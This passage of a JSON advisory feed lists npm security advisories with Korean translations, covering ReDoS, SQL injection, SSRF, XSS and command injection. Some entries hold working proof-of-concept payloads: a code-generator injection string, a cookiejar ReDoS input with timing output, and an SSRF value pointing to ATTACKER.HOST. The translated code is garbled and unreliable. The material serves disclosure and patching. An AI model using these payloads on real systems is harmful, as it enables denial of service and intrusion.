    "descriptionKR": "### 영향\n기본 사전 설정을 사용 중이거나 기능을 직접 처리하지 않는 사람.\n\n### 패치\n사용자가 원본 원시 정보에 액세스할 수 있기 때문에 이를 완전히 방지하는 것은 불가능합니다. 그러나 버전 1부터 제한된 모델에만 액세스하면 이 문제가 발생하지 않습니다.\n\n더 유사한 상황은 보안 문제가 아니라 의도된 동작으로 간주됩니다.\n\n### 해결 방법\n사용자 입력을 벗어날 수 있는 전체 렌더링 프로세스를 변경하는 완전 맞춤형 사전 설정입니다.\n\n### 자세한 내용은\n여기에서 모든 사전 설정을 변경했지만 취약성은 여전히 ​​존재합니다. 여기서는 단순성을 위해 JSON 스키마를 사용하고 있습니다.\n```ts\nconst jsonSchemaDoc = {\n  $id: '커스텀 클래스',\n  유형: '개체',\n  속성: {\n      '속성: 모두; \\n constructor(){console.log(\"injected\")} \\n private _temp': { type: 'string' },\n  }\n};\n생성기 = 새로운 TypeScriptGenerator(\n  {\n    사전 설정: [\n      {\n        수업: {\n            property({ propertyName, 내용 }) {\n              return `비공개 ${propertyName}: any;`;\n            },\n            엑터() {\n              반품 '';\n            },\n            게터() {\n              반품 '';\n            },\n            세터() {\n              반품 '';\n            }\n        }\n      }\n    ]\n  }\n);\nconst inputModel = await generator.process(jsonSchemaDoc);\n```\n이것은 렌더링 할 것입니다\n```ts\n내보내기 클래스 CustomClass {\n  사유 재산: 무엇이든;\n   생성자(){console.log(\"주입됨\")}\n   개인 _temp: 모두;\n  비공개 추가 속성: 모두;\n}\n```"
  },
  {
    "description": "### Description:\nA regular expression denial of service (ReDoS) vulnerability has been discovered in `ua-parser-js`.\n\n### Impact:\nThis vulnerability bypass the library's `MAX_LENGTH` input limit prevention. By crafting a very-very-long user-agent string with specific pattern, an attacker can turn the script to get stuck processing for a very long time which results in a denial of service (DoS) condition.\n\n### Affected Versions:\nAll versions of the library prior to version `0.7.33` / `1.0.33`.\n\n### Patches:\nA patch has been released to remove the vulnerable regular expression, update to version `0.7.33` / `1.0.33` or later.\n\n### References:\n[Regular expression Denial of Service - ReDoS](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)\n\n### Credits:\nThanks to @Snyk who first reported the issue.",
    "identifiers": "GHSA : GHSA-fhg7-m89q-25r3\nCVE : CVE-2022-25927",
    "severity": "HIGH",
    "updatedAt": "2023-06-21T18:10:47Z",
    "publishedAt": "2023-01-24T15:36:32Z",
    "references": "https://github.com/faisalman/ua-parser-js/security/advisories/GHSA-fhg7-m89q-25r3\nhttps://github.com/faisalman/ua-parser-js/commit/a6140a17dd0300a35cfc9cff999545f267889411\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-25927\nhttps://security.snyk.io/vuln/SNYK-JS-UAPARSERJS-3244450\nhttps://github.com/advisories/GHSA-fhg7-m89q-25r3",
    "name": "ua-parser-js",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 0.8.0, < 1.0.33",
    "identifier": "1.0.33",
    "descriptionKR": "### 설명:\n'ua-parser-js'에서 정규식 서비스 거부(ReDoS) 취약점이 발견되었습니다.\n\n### 영향:\n이 취약점은 라이브러리의 `MAX_LENGTH` 입력 제한 방지를 우회합니다. 특정 패턴으로 매우 긴 사용자 에이전트 문자열을 만들어 공격자는 스크립트를 전환하여 매우 오랜 시간 동안 처리를 중단시켜 서비스 거부(DoS) 조건을 초래할 수 있습니다.\n\n### 영향을 받는 버전:\n버전 `0.7.33` / `1.0.33` 이전의 모든 버전의 라이브러리.\n\n### 패치:\n취약한 정규식을 제거하기 위한 패치가 출시되었습니다. 버전 `0.7.33` / `1.0.33` 이상으로 업데이트하십시오.\n\n### 참조:\n[정규식 서비스 거부 - ReDoS](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)\n\n### 크레딧:\n문제를 처음 보고한 @Snyk에게 감사드립니다."
  },
  {
    "description": "### Description:\nA regular expression denial of service (ReDoS) vulnerability has been discovered in `ua-parser-js`.\n\n### Impact:\nThis vulnerability bypass the library's `MAX_LENGTH` input limit prevention. By crafting a very-very-long user-agent string with specific pattern, an attacker can turn the script to get stuck processing for a very long time which results in a denial of service (DoS) condition.\n\n### Affected Versions:\nAll versions of the library prior to version `0.7.33` / `1.0.33`.\n\n### Patches:\nA patch has been released to remove the vulnerable regular expression, update to version `0.7.33` / `1.0.33` or later.\n\n### References:\n[Regular expression Denial of Service - ReDoS](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)\n\n### Credits:\nThanks to @Snyk who first reported the issue.",
    "identifiers": "GHSA : GHSA-fhg7-m89q-25r3\nCVE : CVE-2022-25927",
    "severity": "HIGH",
    "updatedAt": "2023-06-21T18:10:47Z",
    "publishedAt": "2023-01-24T15:36:32Z",
    "references": "https://github.com/faisalman/ua-parser-js/security/advisories/GHSA-fhg7-m89q-25r3\nhttps://github.com/faisalman/ua-parser-js/commit/a6140a17dd0300a35cfc9cff999545f267889411\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-25927\nhttps://security.snyk.io/vuln/SNYK-JS-UAPARSERJS-3244450\nhttps://github.com/advisories/GHSA-fhg7-m89q-25r3",
    "name": "ua-parser-js",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.7.33",
    "identifier": "0.7.33",
    "descriptionKR": "### 설명:\n'ua-parser-js'에서 정규식 서비스 거부(ReDoS) 취약점이 발견되었습니다.\n\n### 영향:\n이 취약점은 라이브러리의 `MAX_LENGTH` 입력 제한 방지를 우회합니다. 특정 패턴으로 매우 긴 사용자 에이전트 문자열을 만들어 공격자는 스크립트를 전환하여 매우 오랜 시간 동안 처리를 중단시켜 서비스 거부(DoS) 조건을 초래할 수 있습니다.\n\n### 영향을 받는 버전:\n버전 `0.7.33` / `1.0.33` 이전의 모든 버전의 라이브러리.\n\n### 패치:\n취약한 정규식을 제거하기 위한 패치가 출시되었습니다. 버전 `0.7.33` / `1.0.33` 이상으로 업데이트하십시오.\n\n### 참조:\n[정규식 서비스 거부 - ReDoS](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)\n\n### 크레딧:\n문제를 처음 보고한 @Snyk에게 감사드립니다."
  },
  {
    "description": "Versions of the package cookiejar before 2.1.4 are vulnerable to Regular Expression Denial of Service (ReDoS) via the `Cookie.parse` function and other aspects of the API, which use an insecure regular expression for parsing cookie values. Applications could be stalled for extended periods of time if untrusted input is passed to cookie values or attempted to parse from request headers.\n\nProof of concept:\n\n```\nts\\nconst { CookieJar } = require(\"cookiejar\");\n\nconst jar = new CookieJar();\n\nconst start = performance.now();\n\nconst attack = \"a\" + \"t\".repeat(50_000);\njar.setCookie(attack);\n\nconsole.log(`CookieJar.setCookie(): ${performance.now() - start}ms`);\n\n```\n\n```\nCookieJar.setCookie(): 2963.214399999939ms\n```",
    "identifiers": "GHSA : GHSA-h452-7996-h45h\nCVE : CVE-2022-25901",
    "severity": "MODERATE",
    "updatedAt": "2023-01-23T16:59:53Z",
    "publishedAt": "2023-01-18T06:31:03Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-25901\nhttps://github.com/bmeck/node-cookiejar/pull/39\nhttps://github.com/bmeck/node-cookiejar/pull/39/commits/eaa00021caf6ae09449dde826108153b578348e5\nhttps://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-3176681\nhttps://security.snyk.io/vuln/SNYK-JS-COOKIEJAR-3149984\nhttps://github.com/bmeck/node-cookiejar/blob/master/cookiejar.js#23L73\nhttps://github.com/advisories/GHSA-h452-7996-h45h",
    "name": "cookiejar",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 2.1.4",
    "identifier": "2.1.4",
    "descriptionKR": "2.1.4 이전 버전의 cookiejar 패키지는 'Cookie.parse' 함수 및 쿠키 값을 구문 분석하기 위해 안전하지 않은 정규식을 사용하는 API의 기타 측면을 통한 정규식 서비스 거부(ReDoS)에 취약합니다. 신뢰할 수 없는 입력이 쿠키 값에 전달되거나 요청 헤더에서 구문 분석을 시도하면 응용 프로그램이 오랜 시간 동안 중단될 수 있습니다.\n\n개념의 증거:\n\n```\nts\\nconst { CookieJar } = require(\"cookiejar\");\n\nconst jar = new CookieJar();\n\nconst 시작 = performance.now();\n\nconst 공격 = \"a\" + \"t\".repeat(50_000);\njar.setCookie(공격);\n\nconsole.log(`CookieJar.setCookie(): ${performance.now() - start}ms`);\n\n```\n\n```\nCookieJar.setCookie(): 2963.214399999939ms\n```"
  },
  {
    "description": "A vulnerability was found in melnaron mel-spintax. It has been rated as problematic. Affected by this issue is some unknown functionality of the file `lib/spintax.js`. The manipulation of the argument text leads to inefficient regular expression complexity. The name of the patch is 37767617846e27b87b63004e30216e8f919637d3. It is recommended to apply a patch to fix this issue. The identifier of this vulnerability is VDB-218456.",
    "identifiers": "GHSA : GHSA-qjm7-55vv-3c5f\nCVE : CVE-2018-25077",
    "severity": "MODERATE",
    "updatedAt": "2023-01-20T23:35:16Z",
    "publishedAt": "2023-01-18T03:31:17Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2018-25077\nhttps://github.com/melnaron/mel-spintax/commit/37767617846e27b87b63004e30216e8f919637d3\nhttps://vuldb.com/?id.218456\nhttps://github.com/advisories/GHSA-qjm7-55vv-3c5f",
    "name": "mel-spintax",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.0.3",
    "identifier": "1.0.3",
    "descriptionKR": "melnaron mel-spintax에서 취약점이 발견되었습니다. 문제가 있는 것으로 평가되었습니다. 이 문제의 영향을 받는 것은 `lib/spintax.js` 파일의 일부 알려지지 않은 기능입니다. 인수 텍스트를 조작하면 비효율적인 정규식이 복잡해집니다. 패치의 이름은 37767617846e27b87b63004e30216e8f919637d3입니다. 이 문제를 해결하려면 패치를 적용하는 것이 좋습니다. 이 취약점의 식별자는 VDB-218456입니다."
  },
  {
    "description": "@builder.io/qwik prior to version 0.16.2 is vulnerable to cross-site scripting due to attribute names and the class attribute values not being properly handled.",
    "identifiers": "GHSA : GHSA-hm7f-rq7q-j9xp\nCVE : CVE-2023-0410",
    "severity": "MODERATE",
    "updatedAt": "2023-01-26T17:04:28Z",
    "publishedAt": "2023-01-20T03:30:28Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-0410\nhttps://github.com/builderio/qwik/commit/4b2f89dbbd2bc0a2c92eae1a49bdd186e589151a\nhttps://huntr.dev/bounties/2da583f0-7f66-4ba7-9bed-8e7229aa578e\nhttps://github.com/advisories/GHSA-hm7f-rq7q-j9xp",
    "name": "@builder.io/qwik",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.16.2",
    "identifier": "0.16.2",
    "descriptionKR": "버전 0.16.2 이전의 @builder.io/qwik는 속성 이름과 클래스 속성 값이 제대로 처리되지 않아 교차 사이트 스크립팅에 취약합니다."
  },
  {
    "description": "### Impact\n\nUsers of a12nserver that use MySQL might be vulnerable to SQL injection bugs. \n\nIf you use a12nserver and MySQL, update as soon as possible. This SQL injection bug might let an attacker obtain OAuth2 Access Tokens for users unrelated to those that permitted OAuth2 clients.\n\n### Patches\n\nThe knex dependency has been updated to 2.4.0 in a12nserver 0.23.0\n\n### Workarounds\n\nNo further workarounds\n\n### References\n\n* https://github.com/knex/knex/issues/1227\n* https://nvd.nist.gov/vuln/detail/CVE-2016-20018\n* https://www.ghostccamm.com/blog/knex_sqli/\n",
    "identifiers": "GHSA : GHSA-crhg-xgrg-vvcc",
    "severity": "MODERATE",
    "updatedAt": "2023-01-29T05:03:48Z",
    "publishedAt": "2023-01-13T21:34:29Z",
    "references": "https://github.com/curveball/a12n-server/security/advisories/GHSA-crhg-xgrg-vvcc\nhttps://nvd.nist.gov/vuln/detail/CVE-2016-20018\nhttps://github.com/knex/knex/issues/1227\nhttps://github.com/curveball/a12n-server/commit/f4acd7549043e6e2b8917b77a50dce0756a922cc\nhttps://github.com/curveball/a12n-server/releases/tag/v0.23.0\nhttps://www.ghostccamm.com/blog/knex_sqli/\nhttps://github.com/advisories/GHSA-crhg-xgrg-vvcc",
    "name": "@curveball/a12n-server",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 0.20.0, < 0.23.0",
    "identifier": "0.23.0",
    "descriptionKR": "### 영향\n\nMySQL을 사용하는 a12nserver 사용자는 SQL 주입 버그에 취약할 수 있습니다.\n\na12nserver 및 MySQL을 사용하는 경우 가능한 한 빨리 업데이트하십시오. 이 SQL 삽입 버그로 인해 공격자는 OAuth2 클라이언트를 허용한 사용자와 관련이 없는 사용자의 OAuth2 액세스 토큰을 얻을 수 있습니다.\n\n### 패치\n\na12nserver 0.23.0에서 knex 종속성이 2.4.0으로 업데이트되었습니다.\n\n### 해결 방법\n\n더 이상의 해결 방법 없음\n\n### 참조\n\n* https://github.com/knex/knex/issues/1227\n* https://nvd.nist.gov/vuln/detail/CVE-2016-20018\n* https://www.ghostccamm.com/blog/knex_sqli/"
  },
  {
    "description": "Versions of the package global-modules-path before 3.0.0 are vulnerable to Command Injection due to missing input sanitization or other checks and sandboxes being employed to the getPath function.",
    "identifiers": "GHSA : GHSA-vvj3-85vf-fgmw\nCVE : CVE-2022-21191",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-28T05:06:24Z",
    "publishedAt": "2023-01-13T06:30:22Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-21191\nhttps://github.com/rosen-vladimirov/global-modules-path/commit/edbdaff077ea0cf295b1469923c06bbccad3c180\nhttps://github.com/lorenzomigliorero/npm-node-utils/blob/b55dd81c597db657c9751332bb2242403fd3e26b/index.js%23L186\nhttps://github.com/rosen-vladimirov/global-modules-path/releases/tag/v3.0.0\nhttps://security.snyk.io/vuln/SNYK-JS-GLOBALMODULESPATH-3167973\nhttps://github.com/advisories/GHSA-vvj3-85vf-fgmw",
    "name": "global-modules-path",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.0.0",
    "identifier": "3.0.0",
    "descriptionKR": "패키지 global-modules-path 3.0.0 이전 버전은 누락된 입력 삭제 또는 getPath 기능에 사용되는 기타 검사 및 샌드박스로 인해 명령 주입에 취약합니다."
  },
  {
    "description": "A vulnerability classified as problematic has been found in cronvel terminal-kit up to 2.1.7. Affected is an unknown function. The manipulation leads to inefficient regular expression complexity. Upgrading to version 2.1.8 can address this issue. The name of the patch is a2e446cc3927b559d0281683feb9b821e83b758c. It is recommended to upgrade the affected component. The identifier of this vulnerability is VDB-217620.",
    "identifiers": "GHSA : GHSA-wxgh-8gmr-3qh3\nCVE : CVE-2021-4306",
    "severity": "HIGH",
    "updatedAt": "2023-01-28T05:04:00Z",
    "publishedAt": "2023-01-07T18:30:20Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-4306\nhttps://github.com/cronvel/terminal-kit/commit/a2e446cc3927b559d0281683feb9b821e83b758c\nhttps://github.com/cronvel/terminal-kit/releases/tag/v2.1.8\nhttps://vuldb.com/?ctiid.217620\nhttps://vuldb.com/?id.217620\nhttps://github.com/advisories/GHSA-wxgh-8gmr-3qh3",
    "name": "terminal-kit",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 2.1.8",
    "identifier": "2.1.8",
    "descriptionKR": "문제로 분류된 취약점이 cronvel terminal-kit 2.1.7까지 발견되었습니다. 영향을 받는 것은 알 수 없는 기능입니다. 조작은 비효율적인 정규식 복잡성을 초래합니다. 버전 2.1.8로 업그레이드하면 이 문제를 해결할 수 있습니다. 패치의 이름은 a2e446cc3927b559d0281683feb9b821e83b758c입니다. 영향을 받는 구성 요소를 업그레이드하는 것이 좋습니다. 이 취약점의 식별자는 VDB-217620입니다."
  },
  {
    "description": "A vulnerability was found in PeterMu nodebatis up to 2.1.x. It has been classified as critical. Affected is an unknown function. The manipulation leads to sql injection. Upgrading to version 2.2.0 can address this issue. The name of the patch is 6629ff5b7e3d62ad8319007a54589ec1f62c7c35. It is recommended to upgrade the affected component. VDB-217554 is the identifier assigned to this vulnerability.",
    "identifiers": "GHSA : GHSA-8ph8-9q2j-c3rq\nCVE : CVE-2018-25066",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-28T05:03:46Z",
    "publishedAt": "2023-01-06T12:31:34Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2018-25066\nhttps://github.com/PeterMu/nodebatis/commit/6629ff5b7e3d62ad8319007a54589ec1f62c7c35\nhttps://github.com/PeterMu/nodebatis/releases/tag/v2.2.0\nhttps://vuldb.com/?ctiid.217554\nhttps://vuldb.com/?id.217554\nhttps://github.com/advisories/GHSA-8ph8-9q2j-c3rq",
    "name": "nodebatis",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 2.2.0",
    "identifier": "2.2.0",
    "descriptionKR": "PeterMu nodebatis 2.1.x까지 취약점이 발견되었습니다. 크리티컬로 분류되었습니다. 영향을 받는 것은 알 수 없는 기능입니다. 조작은 SQL 인젝션으로 이어집니다. 버전 2.2.0으로 업그레이드하면 이 문제를 해결할 수 있습니다. 패치 이름은 6629ff5b7e3d62ad8319007a54589ec1f62c7c35입니다. 영향을 받는 구성 요소를 업그레이드하는 것이 좋습니다. VDB-217554는 이 취약점에 할당된 식별자입니다."
  },
  {
    "description": "A vulnerability classified as problematic has been found in debug-js debug up to 3.0.x. This affects the function useColors of the file src/node.js. The manipulation of the argument str leads to inefficient regular expression complexity. Upgrading to version 3.1.0 is able to address this issue. The name of the patch is c38a0166c266a679c8de012d4eaccec3f944e685. It is recommended to upgrade the affected component. The identifier VDB-217665 was assigned to this vulnerability. The patch has been backported to the 2.6.x branch in version 2.6.9.",
    "identifiers": "GHSA : GHSA-9vvw-cc9w-f27h\nCVE : CVE-2017-20165",
    "severity": "HIGH",
    "updatedAt": "2023-01-29T05:03:24Z",
    "publishedAt": "2023-01-09T12:30:19Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2017-20165\nhttps://github.com/debug-js/debug/pull/504\nhttps://github.com/debug-js/debug/commit/c38a0166c266a679c8de012d4eaccec3f944e685\nhttps://github.com/debug-js/debug/releases/tag/3.1.0\nhttps://vuldb.com/?id.217665\nhttps://github.com/debug-js/debug/releases/tag/2.6.9\nhttps://vuldb.com/?ctiid.217665\nhttps://github.com/advisories/GHSA-9vvw-cc9w-f27h",
    "name": "debug",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 3.0.0, < 3.1.0",
    "identifier": "3.1.0",
    "descriptionKR": "debug-js 디버그 3.0.x까지 문제로 분류된 취약점이 발견되었습니다. 이는 src/node.js 파일의 useColors 함수에 영향을 미칩니다. str 인수를 조작하면 비효율적인 정규식이 복잡해집니다. 버전 3.1.0으로 업그레이드하면 이 문제를 해결할 수 있습니다. 패치의 이름은 c38a0166c266a679c8de012d4eccec3f944e685입니다. 영향을 받는 구성 요소를 업그레이드하는 것이 좋습니다. 식별자 VDB-217665가 이 취약점에 할당되었습니다. 패치는 버전 2.6.9에서 2.6.x 분기로 백포트되었습니다."
  },
  {
    "description": "A vulnerability was found in mholt PapaParse up to 5.1.x. It has been classified as problematic. Affected is an unknown function of the file papaparse.js. The manipulation leads to inefficient regular expression complexity. Upgrading to version 5.2.0 is able to address this issue. The name of the patch is 235a12758cd77266d2e98fd715f53536b34ad621. It is recommended to upgrade the affected component. The identifier of this vulnerability is VDB-218004.",
    "identifiers": "GHSA : GHSA-798h-g4j5-5537\nCVE : CVE-2020-36649",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:05:45Z",
    "publishedAt": "2023-01-11T15:30:28Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-36649\nhttps://github.com/mholt/PapaParse/issues/777\nhttps://github.com/mholt/PapaParse/pull/779\nhttps://github.com/mholt/PapaParse/commit/235a12758cd77266d2e98fd715f53536b34ad621\nhttps://github.com/mholt/PapaParse/releases/tag/5.2.0\nhttps://vuldb.com/?ctiid.218004\nhttps://vuldb.com/?id.218004\nhttps://github.com/advisories/GHSA-798h-g4j5-5537",
    "name": "papaparse",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 5.2.0",
    "identifier": "5.2.0",
    "descriptionKR": "mholt PapaParse 최대 5.1.x에서 취약점이 발견되었습니다. 문제가 있는 것으로 분류되었습니다. 영향을 받는 것은 papaparse.js 파일의 알 수 없는 기능입니다. 조작은 비효율적인 정규식 복잡성을 초래합니다. 버전 5.2.0으로 업그레이드하면 이 문제를 해결할 수 있습니다. 패치 이름은 235a12758cd77266d2e98fd715f53536b34ad621입니다. 영향을 받는 구성 요소를 업그레이드하는 것이 좋습니다. 이 취약점의 식별자는 VDB-218004입니다."
  },
  {
    "description": "Uniswap Universal Router before 1.1.0 mishandles reentrancy. This would have allowed theft of funds.",
    "identifiers": "GHSA : GHSA-7m37-cx35-qgmr\nCVE : CVE-2022-48216",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:03:47Z",
    "publishedAt": "2023-01-04T18:31:00Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-48216\nhttps://github.com/Uniswap/universal-router/pull/189\nhttps://github.com/Uniswap/universal-router/commit/d82c6685ef566d9b280651c99f4b93a8454c08a8\nhttps://github.com/Uniswap/universal-router/compare/v1.0.1...v1.1.0\nhttps://media.dedaub.com/uniswap-bug-bounty-1625d8ff04ae\nhttps://twitter.com/dedaub/status/1610058814094450694\nhttps://github.com/advisories/GHSA-7m37-cx35-qgmr",
    "name": "@uniswap/universal-router",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.1.0",
    "identifier": "1.1.0",
    "descriptionKR": "1.1.0 이전의 Uniswap 범용 라우터는 재진입을 잘못 처리합니다. 이것은 자금 절도를 허용했을 것입니다."
  },
  {
    "description": "## Summary\n\nRSSHub is vulnerable to Server-Side Request Forgery (SSRF) attacks. This vulnerability allows an attacker to send arbitrary HTTP requests from the server to other servers or resources on the network.\n\n## Description\n\nAn attacker can exploit this vulnerability by sending a request to the affected routes with a malicious URL. For example, if an attacker controls the `ATTACKER.HOST` domain, they can send a request to affected routes with the value set to `ATTACKER.HOST%2F%23`.\nThe `%2F` and `%23` characters are URL-encoded versions of the forward-slash (`/`) and pound (`#`) characters, respectively. In this context, an attacker could use those characters to append the base URL (i.e. `https://${input}.defined.host`) to be modified to `https://ATTACKER.HOST/#.defined.host`. This will cause the server to send a request to the attacker-controlled domain, allowing the attacker to potentially gain access to sensitive information or perform further attacks on the server. \n\n## Impact\n\nAn attacker could use this vulnerability to send requests to internal or any other servers or resources on the network, potentially gain access to sensitive information that would not normally be accessible and amplifying the impact of the attack.\n\n## Reference\n\nFixing PR: https://github.com/DIYgod/RSSHub/pull/11588",
    "identifiers": "GHSA : GHSA-64wp-jh9p-5cg2\nCVE : CVE-2023-22493",
    "severity": "HIGH",
    "updatedAt": "2023-01-23T22:17:34Z",
    "publishedAt": "2023-01-11T22:04:44Z",
    "references": "https://github.com/DIYgod/RSSHub/security/advisories/GHSA-64wp-jh9p-5cg2\nhttps://github.com/DIYgod/RSSHub/pull/11588\nhttps://github.com/DIYgod/RSSHub/commit/a66cbcf6eebc700bf97ab097f404f16ab415506a\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-22493\nhttps://advisory.dw1.io/56\nhttps://github.com/advisories/GHSA-64wp-jh9p-5cg2",
    "name": "rsshub",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.0.0-master.a66cbcf",
    "identifier": "1.0.0-master.a66cbcf",
    "descriptionKR": "## 요약\n\nRSSHub는 SSRF(Server-Side Request Forgery) 공격에 취약합니다. 이 취약점을 통해 공격자는 서버에서 네트워크의 다른 서버나 리소스로 임의의 HTTP 요청을 보낼 수 있습니다.\n\n## 설명\n\n공격자는 악성 URL을 사용하여 영향을 받는 경로에 요청을 보냄으로써 이 취약점을 악용할 수 있습니다. 예를 들어 공격자가 'ATTACKER.HOST' 도메인을 제어하는 ​​경우 'ATTACKER.HOST%2F%23'으로 설정된 값을 사용하여 영향을 받는 경로에 요청을 보낼 수 있습니다.\n`%2F` 및 `%23` 문자는 각각 슬래시(`/`) 및 파운드(`#`) 문자의 URL 인코딩 버전입니다. 이 컨텍스트에서 공격자는 해당 문자를 사용하여 기본 URL(예: `https://${input}.defined.host`)을 `https://ATTACKER.HOST/#.defined.host`로 수정할 수 있습니다. `. 이로 인해 서버는 공격자가 제어하는 ​​도메인에 요청을 보내 공격자가 중요한 정보에 대한 액세스 권한을 얻거나 서버에 대한 추가 공격을 수행할 수 있습니다.\n\n## 영향\n\n공격자는 이 취약점을 사용하여 내부 또는 네트워크의 다른 서버나 리소스에 요청을 보내고 일반적으로 액세스할 수 없는 민감한 정보에 대한 액세스 권한을 얻어 공격의 영향을 증폭시킬 수 있습니다.\n\n## 참조\n\nPR 수정: https://github.com/DIYgod/RSSHub/pull/11588"
  },
  {
    "description": "A vulnerability, which was classified as critical, was found in IonicaBizau node-gry up to 5.x. This affects an unknown part. The manipulation leads to command injection. Upgrading to version 6.0.0 is able to address this issue. The name of the patch is 5108446c1e23960d65e8b973f1d9486f9f9dbd6c. It is recommended to upgrade the affected component. The associated identifier of this vulnerability is VDB-218019.",
    "identifiers": "GHSA : GHSA-w5mw-f2hq-5fw8\nCVE : CVE-2020-36650",
    "severity": "HIGH",
    "updatedAt": "2023-02-03T05:04:30Z",
    "publishedAt": "2023-01-11T18:30:27Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-36650\nhttps://github.com/IonicaBizau/node-gry/pull/22\nhttps://github.com/IonicaBizau/node-gry/commit/5108446c1e23960d65e8b973f1d9486f9f9dbd6c\nhttps://github.com/IonicaBizau/node-gry/releases/tag/6.0.0\nhttps://vuldb.com/?ctiid.218019\nhttps://vuldb.com/?id.218019\nhttps://github.com/advisories/GHSA-w5mw-f2hq-5fw8",
    "name": "gry",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 6.0.0",
    "identifier": "6.0.0",
    "descriptionKR": "IonicaBizau node-gry 5.x 버전에서 critical로 분류된 취약점이 발견되었습니다. 알 수 없는 부분에 영향을 미칩니다. 조작은 명령 주입으로 이어집니다. 버전 6.0.0으로 업그레이드하면 이 문제를 해결할 수 있습니다. 패치의 이름은 5108446c1e23960d65e8b973f1d9486f9f9dbd6c입니다. 영향을 받는 구성 요소를 업그레이드하는 것이 좋습니다. 이 취약점의 관련 식별자는 VDB-218019입니다."
  },
  {
    "description": "In TypeStack class-validator, `validate()` input validation can be bypassed because certain internal attributes can be overwritten via a conflicting name. Even though there is an optional `forbidUnknownValues` parameter that can be used to reduce the risk of this bypass, this option is not documented and thus most developers configure input validation in the vulnerable default manner. With this vulnerability, attackers can launch SQL Injection or XSS attacks by injecting arbitrary malicious input.\n\nThe default settings for `forbidUnknownValues` has been changed to `true` in 0.14.0.\n\nNOTE: a software maintainer agrees with the \"is not documented\" finding but suggests that much of the responsibility for the risk lies in a different product.",
    "identifiers": "GHSA : GHSA-fj58-h2fr-3pp2\nCVE : CVE-2019-18413",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-27T05:03:13Z",
    "publishedAt": "2021-10-12T16:35:45Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2019-18413\nhttps://github.com/typestack/class-validator/issues/438\nhttps://github.com/typestack/class-validator#passing-options\nhttps://github.com/typestack/class-validator/issues/438#issuecomment-964728471\nhttps://github.com/typestack/class-validator/issues/1422#issuecomment-1344635415\nhttps://github.com/typestack/class-validator/pull/1798\nhttps://github.com/advisories/GHSA-fj58-h2fr-3pp2",
    "name": "class-validator",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.14.0",
    "identifier": "0.14.0",
    "descriptionKR": "TypeStack 클래스 유효성 검사기에서 'validate()' 입력 유효성 검사는 충돌하는 이름을 통해 특정 내부 특성을 덮어쓸 수 있기 때문에 무시할 수 있습니다. 이 우회의 위험을 줄이는 데 사용할 수 있는 선택적 `forbidUnknownValues` 매개변수가 있지만 이 옵션은 문서화되어 있지 않으므로 대부분의 개발자는 취약한 기본 방식으로 입력 유효성 검사를 구성합니다. 이 취약점을 통해 공격자는 임의의 악의적인 입력을 주입하여 SQL 주입 또는 XSS 공격을 시작할 수 있습니다.\n\n0.14.0에서 `forbidUnknownValues`의 기본 설정이 `true`로 변경되었습니다.\n\n참고: 소프트웨어 관리자는 \"문서화되지 않음\" 결과에 동의하지만 위험에 대한 많은 책임이 다른 제품에 있다고 제안합니다."
  },
  {
    "description": "A vulnerability was found in Prestaul skeemas and classified as problematic. This issue affects some unknown processing of the file validators/base.js. The manipulation of the argument uri leads to inefficient regular expression complexity. The name of the patch is 65e94eda62dc8dc148ab3e59aa2ccc086ac448fd. It is recommended to apply a patch to fix this issue. The associated identifier of this vulnerability is VDB-218003.",
    "identifiers": "GHSA : GHSA-qv66-f876-vjvr\nCVE : CVE-2018-25074",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:06:11Z",
    "publishedAt": "2023-01-11T15:30:28Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2018-25074\nhttps://github.com/Prestaul/skeemas/commit/65e94eda62dc8dc148ab3e59aa2ccc086ac448fd\nhttps://vuldb.com/?ctiid.218003\nhttps://vuldb.com/?id.218003\nhttps://github.com/advisories/GHSA-qv66-f876-vjvr",
    "name": "skeemas",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.2.5",
    "identifier": "1.2.5",
